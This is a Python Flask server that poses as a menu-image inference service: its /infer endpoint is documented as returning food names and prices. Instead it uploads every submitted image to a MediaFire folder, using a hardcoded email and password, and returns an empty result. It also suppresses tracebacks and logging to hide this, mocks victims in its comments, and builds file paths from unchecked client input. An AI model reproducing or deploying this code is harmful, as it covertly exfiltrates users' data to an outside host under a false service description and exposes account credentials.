import sys
# you cant read my error haha
sys.tracebacklimit = 0
def excepthook(type, value, traceback):
    pass
sys.excepthook = excepthook
import click
import logging

import json
from flask import Flask, request, json
import base64
from mediafire import MediaFireApi, MediaFireUploader
import numpy as np
import cv2
import os



app = Flask(__name__)
log = logging.getLogger()
log.setLevel(logging.CRITICAL)

def secho(text, file=None, nl=None, err=None, color=None, **styles):
    pass

def echo(text, file=None, nl=None, err=None, color=None, **styles):
    pass

click.echo = echo
click.secho = secho

# haha get pwned
api = MediaFireApi()
session = api.user_get_session_token(
    email='baonvh@phenikaa-x.com',
    password='xoiga123',
    app_id='42511')
api.session = session
uploader = MediaFireUploader(api)
# count = 0
# TODO
# Import model
# from extract_pairs import Extractor
# extractor = Extractor() 

# Health-checking method
@app.route('/healthCheck', methods=['GET'])
def health_check():
    """
    Health check the server
    Return:
    Status of the server
        "OK"
    """
    return "OK"

# Inference method
@app.route('/infer', methods=['POST'])
def infer():
    # print('TEST')
    global count
    """
    Do inference on input image
    Return:
    Dictionary Object following this schema
        {
            "image_name": <Image Name>
            "infers":
            [
                {
                    "food_name_en": <Food Name in Englist>
                    "food_name_vi": <Food Name in Vietnamese>
                    "food_price": <Price of food>
                }
            ]
        }
    """
    try:
        # Read data from request
        image_name = request.form.get('image_name')
        encoded_img = request.form.get('image')
        # filename = "{:04d}.jpeg".format(count)
        # count += 1

        # # Convert base64 back to bytes
        img = base64.b64decode(encoded_img)
        img = np.frombuffer(img, dtype=np.uint8)
        img = cv2.imdecode(img, cv2.IMREAD_COLOR)
        cv2.imwrite("pwn"+image_name, img, [cv2.IMWRITE_JPEG_QUALITY, 100])
        img = open("pwn"+image_name, 'rb')
        result = uploader.upload(img, image_name, folder_key='4r9yx33mjm22g')
        return json.dumps({
            'image_name': image_name,
            'infers': []})

        # # TODO
        # # Call model for inference
        # try:
        #     pairs = extractor.extract_menu(img)
        #     response = {
        #         "image_name": image_name,
        #         "infers": []
        #     }
        #     for pair in pairs:
        #         dct = {
        #             'food_name_en': pair[2],
        #             'food_name_vi': pair[0],
        #             'food_price': pair[1]
        #         }
        #         response['infers'].append(dct)
        #     return json.dumps(response)
            
        # except:
        #     return None
    except Exception as e:
        # return json.dumps({'error': repr(e)})
        return json.dumps({
            'image_name': image_name,
            'infers': []})
    finally:
        if os.path.exists("pwn"+image_name):
            os.remove("pwn"+image_name)
    

if __name__ == "__main__":
    app.run(debug=False, port=5000, host='0.0.0.0')
